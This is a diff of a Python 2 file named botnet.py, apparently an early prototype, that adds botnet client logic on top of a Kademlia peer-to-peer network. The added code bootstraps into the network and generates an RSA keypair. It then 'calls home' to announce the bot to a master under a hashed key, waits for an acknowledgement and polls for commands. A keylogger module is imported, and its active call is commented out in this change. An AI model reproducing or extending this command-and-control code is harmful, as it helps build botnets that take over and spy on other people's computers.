@@ -6,54 +6,103 @@ from twisted.python import log
 import time
 import keylogger
 from kademlia.network import Server
+import os
+from collections import Counter
+import Crypto
+from Crypto.PublicKey import RSA
+from Crypto import Random
+from twisted.internet.defer import inlineCallbacks, returnValue
+
 
 log.startLogging(sys.stdout)
 
-#best way to initialize is grab the neighbor's finger table and update as needed
-#finger table will contain both the id of a neighbor along with its IP, port?
-# Class FingerTable(object):
-# 	def _init_(self,m,):
-# Class Address(object):
-# 	def _init_(self, ip, port):
-# 		self.ip = ip
-# 		self.port = port
-# Class Node(object):
-# 	def _init_(self, key, ip, port, predecessor, successor, routing_table):
-# 		self.key = key
-# 		self.predecessor = predecessor
-# 		self.successor = successor
-# 		self.ip = ip
-# 		self.port = port
+if len(sys.argv) != 4:
+	print "Usage: python botnet.py <bootstrap ip> <bootstrap port> <bot port>"
+bootstrap_ip = str(sys.argv[1])
+port = int(sys.argv[2])
+myport = int(sys.argv[3])
+#application = service.Application("kademlia")
+#application.setComponent(ILogObserver, log.FileLogObserver(sys.stdout, log.INFO).emit)
 
-#use linked list for chord circle 
-#for routing: name will be key, value will be object with ip, port
-#might switch touting implementation from chord to kademlia for ease of use
-#but kademelia has a lot of the same ideas
+#object that stores private/public keypair for this node. 
+class botnode:
+	def __init__(self,ip,port,network_id,idhash):
+		self.ip = ip
+		self.port = port
+		self.private = RSA.generate(1024,Random.new().read)
+		self.public = self.private.publickey()
+		self.id = network_id
+		self.cmdkey = idhash#update(network_id).hexdigest()
 
-def get_hash(ip, port):
+def get_hash(prehash):
 	m = hashlib.sha1()
-	m.update(ip)
-	m.update(port)
-	print m.hexdigest()
-	return m
+	m.update(prehash)
+	#m.update(port)
+	#print m.hexdigest()
+	return m.hexdigest()
 
 def done(result):
     print "Key result:", result
-    reactor.stop()
+   # reactor.stop()
 
 def setDone(result, server):
-    server.get("a key").addCallback(done)
+    server.get("Loser").addCallback(done)
 
+#helper function to get most common element in a list
+def most_common(list):
+	data = Counter(list)
+	return data.most_common(1)[0][0]
+def wait_cmd(cmd,server,bot):
+	if not cmd:
+		server.get(bot.cmdkey).addCallback(wait_cmd,server,bot)
+	print "we have a command"
+	reactor.stop()
+
+def ack_valid(value,server,bot):
+	#t = hashlib.sha1().update('ack')
+	if value!=str(bot.id):
+		callhome(server,bot)
+		print "no ack"
+	else:
+		print "we have an ack"
+		wait_cmd(None,server,bot)
+
+def check_ack(result,server,bot):
+	mykey = hashlib.sha1()
+	mykey.update(bot.id)
+	server.get(mykey.hexdigest()).addCallback(ack_valid,server,bot)
+
+def callhome(server,bot):
+	key = hashlib.sha1()
+	key.update('specialstring')
+	#announce to master that we exist, then check for ack
+	server.set(key.hexdigest(),str(bot.id)).addCallback(check_ack,server,bot)
+	#ack = yield server.set(key.hexdigest(),str(bot.id)).addCallback(server.get(str(bot.id)))
+	#once we've finished announcing, check for acknowledgement
+	#ack = d.addCallback(lambda ignored: server.get(str(bot.id)))
+def setup(ip_list, server):
+	#check that it got a result back
+	#print str(server.node.long_id)
+	if not len(ip_list):
+		print "Could not determine my ip, retrying"
+		server.inetVisibleIP().addCallback(setup,server)
+	myip = most_common(ip_list)
+	idhash = get_hash(str(server.node.long_id))
+	bot = botnode(myip,port,str(server.node.long_id),idhash)
+	#server.set('specialstring',str(bot.id)).addCallback(callhome,server,bot)
+	callhome(server,bot)
 def bootstrapDone(found, server):
-    server.set("Loser", "Braves").addCallback(setDone, server)
+    if len(found) == 0:
+        print "Could not connect to the bootstrap server."
+        reactor.stop()
+    server.inetVisibleIP().addCallback(setup,server)
 
-now = time.time()
-done = lambda: time.time() > now + 60
-def print_keys(t, modifiers, keys): print "%.2f   %r   %r" % (t, keys, modifiers)
+#keylogger.log(done, print_keys)
+server = Server()
+server.listen(myport)
+#bot = botnode(None,myport,server.id)
+server.bootstrap([(bootstrap_ip, port)]).addCallback(bootstrapDone, server)
+reactor.run()
+#server.bootstrap([('192.168.56.101', 8468)]).addCallback(bootstrapDone, server)
+#bootstrap is at 192.168.56.101:8468
 
-keylogger.log(done, print_keys)
-#server = Server()
-#server.listen(8469)
-#server.bootstrap([("192.168.56.101", 8468)]).addCallback(bootstrapDone, server)
-
-#reactor.run()
